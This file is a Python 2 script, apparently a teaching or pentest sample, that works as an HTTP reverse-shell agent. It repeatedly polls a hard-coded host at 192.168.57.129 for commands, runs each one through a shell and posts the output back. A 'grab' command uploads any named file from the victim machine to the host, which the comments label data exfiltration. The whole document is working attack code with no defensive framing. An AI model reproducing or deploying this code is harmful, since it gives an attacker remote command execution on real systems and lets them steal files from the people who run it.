import requests 
import subprocess 
import os
import time

while True: 

    req = requests.get('http://192.168.57.129')
    command = req.text
        
    if 'close' in command:
        break

    # Data Exfilteration
    elif 'grab' in command:
        grab,path = command.split(' ')

        #Check if file exists
        try:
            if os.path.exists(path):
                url = 'http://192.168.57.129/doc'  # /doc in the URL indicates a document has been attached
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url='http://192.168.57.129', data='File not found on the target' )
        except Exception,e:
            post_response = requests.post(url='http://192.168.57.129', data=str(e) )
  
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stdout.read() )
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stderr.read() )

    time.sleep(3)
    
